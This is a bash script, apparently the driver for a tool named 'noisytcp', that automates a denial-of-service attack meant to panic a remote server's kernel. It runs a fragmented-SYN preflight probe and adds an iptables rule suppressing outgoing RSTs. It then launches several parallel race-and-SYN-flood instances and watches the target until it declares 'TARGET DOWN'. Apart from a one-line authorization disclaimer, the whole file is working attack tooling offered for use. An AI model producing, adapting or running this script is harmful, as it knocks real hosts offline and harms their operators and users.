#!/usr/bin/env bash
# NoisyTCP campaign driver.
#
# Wraps ./noisytcp with the boring parts: preflight probe, RST guard, several
# concurrent instances on disjoint source-port blocks, liveness monitor and a
# timestamped log. Stops itself when the target stops answering.
#
#   sudo ./lab/campaign.sh --target 203.0.113.10 --port 25565
#   sudo ./lab/campaign.sh --target 203.0.113.10 --port 25565 \
#        --instances 2 --duration 1800 --race-threads 12
#
# Everything here assumes you own or are explicitly authorized to test the
# target; it will panic the target kernel.

set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(dirname "$SELF_DIR")"
BIN="$ROOT/noisytcp"

TARGET=""; PORT=""; DURATION=0; LOG=""
BASE_SPORT=40000; TUPLES=64; INSTANCES=1
RACE_PPS=40000; FLOOD_PPS=30000; PULSE=300; BURST=6; MSS=1460
RACE_THREADS=0; FLOOD_THREADS=4
NO_GUARD=0; NO_MON=0; GRACE=4

die()  { echo "[-] $*" >&2; exit 1; }
log()  { echo "[*] $*" >&2; }

usage() {
    cat >&2 <<'EOF'
Usage: sudo ./lab/campaign.sh --target IP --port P [opts]

  --target IP          single target IPv4 (required)
  --port P             target TCP port (required)
  --instances N        concurrent patchers, disjoint port blocks (1..8, def 1)
  --tuples N           race tuples per instance (def 64)
  --base-sport P       first source port (def 40000, block = 1024 ports)
  --race-pps N         probe rate per race thread (def 40000)
  --flood-pps N        SYN flood rate per flood thread (def 30000)
  --race-threads N     worker threads (def cpus-2, max 16)
  --flood-threads N    flood threads per instance (def 4)
  --pulse-ms N         flood gate period (def 300; 0 breaks the trigger)
  --burst N            fragmented probes per cycle (def 6)
  --mss N              SYN MSS (def 1460)
  --duration S         wall time budget, 0 = until down/Ctrl-C (def 0)
  --log FILE           log path (def lab/campaign-<ip>-<ts>.log)
  --no-guard           do not touch iptables
  --no-monitor         do not watch liveness
  --grace N            failed checks before declaring DOWN (def 4)
  -h, --help           this text
EOF
}

need_val() { [ "${2:-}" -ge 2 ] 2>/dev/null || die "option $1 needs a value"; }

while [ $# -gt 0 ]; do
    case "$1" in
        --target)       need_val "$1" $#; TARGET=$2; shift 2 ;;
        --port)         need_val "$1" $#; PORT=$2; shift 2 ;;
        --instances)    need_val "$1" $#; INSTANCES=$2; shift 2 ;;
        --tuples)       need_val "$1" $#; TUPLES=$2; shift 2 ;;
        --base-sport)   need_val "$1" $#; BASE_SPORT=$2; shift 2 ;;
        --race-pps)     need_val "$1" $#; RACE_PPS=$2; shift 2 ;;
        --flood-pps)    need_val "$1" $#; FLOOD_PPS=$2; shift 2 ;;
        --race-threads) need_val "$1" $#; RACE_THREADS=$2; shift 2 ;;
        --flood-threads) need_val "$1" $#; FLOOD_THREADS=$2; shift 2 ;;
        --pulse-ms)     need_val "$1" $#; PULSE=$2; shift 2 ;;
        --burst)        need_val "$1" $#; BURST=$2; shift 2 ;;
        --mss)          need_val "$1" $#; MSS=$2; shift 2 ;;
        --duration)     need_val "$1" $#; DURATION=$2; shift 2 ;;
        --log)          need_val "$1" $#; LOG=$2; shift 2 ;;
        --grace)        need_val "$1" $#; GRACE=$2; shift 2 ;;
        --no-guard)     NO_GUARD=1; shift ;;
        --no-monitor)   NO_MON=1; shift ;;
        -h|--help)      usage; exit 0 ;;
        *)              die "unknown argument: $1" ;;
    esac
done

[ -n "$TARGET" ] && [ -n "$PORT" ] || { usage; exit 1; }
[ "$(id -u)" -eq 0 ] || die "root required (raw sockets, iptables)"
[ -x "$BIN" ] || die "missing $BIN -- run ./build.sh first"
[ "$INSTANCES" -ge 1 ] && [ "$INSTANCES" -le 8 ] || die "instances 1..8"

NCPU=$(nproc 2>/dev/null || echo 4)
[ "$RACE_THREADS" -eq 0 ] && RACE_THREADS=$(( NCPU > 3 ? NCPU - 2 : 1 ))
[ "$RACE_THREADS" -gt 16 ] && RACE_THREADS=16
[ "$RACE_THREADS" -gt "$TUPLES" ] && RACE_THREADS=$TUPLES
[ "$FLOOD_THREADS" -ge 1 ] || FLOOD_THREADS=1
[ "$FLOOD_THREADS" -gt 8 ] && FLOOD_THREADS=8
[ "$PULSE" -eq 0 ] && log "warning: --pulse-ms 0 starves the hashed-request path"

[ -n "$LOG" ] || LOG="$ROOT/lab/campaign-$(echo "$TARGET" | tr . _)-$(date +%Y%m%d-%H%M%S).log"
mkdir -p "$(dirname "$LOG")"
: > "$LOG"

SPAN_END=$(( BASE_SPORT + INSTANCES * 1024 - 1 ))
log "campaign: target=$TARGET:$PORT instances=$INSTANCES tuples=$TUPLES"
log "rates: race=${RACE_PPS}x${RACE_THREADS} flood=${FLOOD_PPS}x${FLOOD_THREADS} pulse=${PULSE}ms"
log "sport span: $BASE_SPORT..$SPAN_END   log: $LOG"

# --- preflight: the whole method depends on fragments surviving the path ----
log "preflight probe (plain + fragmented SYNs)"
PROBE_OUT=$("$BIN" --target "$TARGET" --port "$PORT" --probe 2>&1)
PROBE_RC=$?
printf '%s\n' "$PROBE_OUT" | tail -n 3 >&2
printf '%s\n' "$PROBE_OUT" >> "$LOG"
[ "$PROBE_RC" -eq 0 ] || die "probe says this position cannot deliver 8-byte first-fragment splits; move the sender (see README 11.6)"

# --- RST guard: our own kernel must not reset the tuples being raced -------
GUARD_ADDED=0
if [ "$NO_GUARD" -eq 0 ]; then
    if command -v iptables >/dev/null 2>&1; then
        if iptables -C OUTPUT -p tcp --tcp-flags RST RST --sport "$BASE_SPORT:$SPAN_END" -j DROP 2>/dev/null; then
            log "RST guard already present ($BASE_SPORT:$SPAN_END)"
        elif iptables -I OUTPUT -p tcp --tcp-flags RST RST --sport "$BASE_SPORT:$SPAN_END" -j DROP 2>/dev/null; then
            GUARD_ADDED=1
            log "RST guard installed ($BASE_SPORT:$SPAN_END)"
        else
            log "warning: could not install RST guard, replies may reset tuples"
        fi
    else
        log "warning: iptables not found, skipping RST guard"
    fi
fi

PIDS=(); DOWN=0; MON_PID=""
cleanup() {
    local p
    for p in "${PIDS[@]:-}"; do kill -INT "$p" 2>/dev/null; done
    wait 2>/dev/null
    if [ "$GUARD_ADDED" -eq 1 ]; then
        iptables -D OUTPUT -p tcp --tcp-flags RST RST --sport "$BASE_SPORT:$SPAN_END" -j DROP 2>/dev/null
        echo "[*] RST guard removed" >&2
    fi
}
trap cleanup EXIT
trap 'exit 130' INT TERM

alive() {
    if command -v ping >/dev/null 2>&1 && ping -c1 -W1 "$TARGET" >/dev/null 2>&1; then
        return 0
    fi
    (exec 3<>"/dev/tcp/$TARGET/$PORT") 2>/dev/null
}

monitor() {
    local fails=0
    while :; do
        sleep 1
        if alive; then fails=0; continue; fi
        fails=$((fails + 1))
        echo "[mon] $TARGET:$PORT unreachable (${fails}/${GRACE})" >&2
        [ "$fails" -lt "$GRACE" ] && continue
        echo "[mon] TARGET DOWN at $(date -Is)" | tee -a "$LOG" >&2
        DOWN=1
        local p
        for p in "${PIDS[@]}"; do kill -INT "$p" 2>/dev/null; done
        return 0
    done
}

[ "$NO_MON" -eq 0 ] && { monitor & MON_PID=$!; }

for i in $(seq 0 $(( INSTANCES - 1 ))); do
    BS=$(( BASE_SPORT + i * 1024 ))
    "$BIN" --target "$TARGET" --port "$PORT" \
        --base-sport "$BS" --tuples "$TUPLES" \
        --race-threads "$RACE_THREADS" --race-pps "$RACE_PPS" \
        --flood-threads "$FLOOD_THREADS" --flood-pps "$FLOOD_PPS" \
        --pulse-ms "$PULSE" --burst "$BURST" --mss "$MSS" \
        --pin --duration "$DURATION" >>"$LOG" 2>&1 &
    PIDS+=($!)
    log "instance $((i + 1))/$INSTANCES up: sports $BS..$(( BS + TUPLES - 1 ))"
done

for p in "${PIDS[@]}"; do wait "$p" 2>/dev/null; done
[ -n "$MON_PID" ] && kill "$MON_PID" 2>/dev/null
MON_PID=""

if [ "$DOWN" -eq 1 ]; then
    log "result: TARGET DOWN — target kernel panicked, campaign done"
    exit 0
fi
log "result: target survived this run; see $LOG"
exit 1
